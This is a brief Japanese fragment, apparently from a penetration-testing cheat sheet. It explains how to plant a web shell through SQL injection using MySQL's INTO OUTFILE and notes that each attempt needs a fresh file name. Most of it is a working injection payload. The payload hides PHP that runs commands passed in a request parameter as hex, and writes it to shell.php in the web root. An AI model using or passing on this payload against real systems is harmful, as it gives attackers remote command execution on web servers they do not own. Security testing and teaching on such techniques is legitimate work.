...
## INTO OUTFILE シェルアップロード

**INTO OUTFILE は既存ファイルの上書きはできないため、毎回新しいファイル名を指定する必要がある。**
...
UNION を使う場合は気にしなくてよい。

```sql
' UNION SELECT 1,2 INTO OUTFILE '/var/www/html/shell.php' LINES TERMINATED BY 0x3C3F706870206563686F20223C7072653E22202E207368656C6C5F6578656328245F4745545B22636D64225D29202E20223C2F7072653E223B3F3E-- -
```
